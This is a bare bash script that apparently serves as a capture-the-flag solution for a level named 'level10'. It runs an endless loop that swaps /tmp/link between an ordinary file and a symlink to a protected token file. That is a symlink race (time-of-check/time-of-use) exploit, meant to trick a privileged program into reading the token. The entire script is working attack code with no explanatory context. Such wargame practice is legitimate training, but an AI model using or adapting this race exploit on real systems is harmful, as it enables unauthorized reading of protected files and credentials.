#!/bin/bash

while true;
do
  touch /tmp/link
  rm -f /tmp/link
  ln -s /home/user/level10/token /tmp/link
  rm -f /tmp/link
done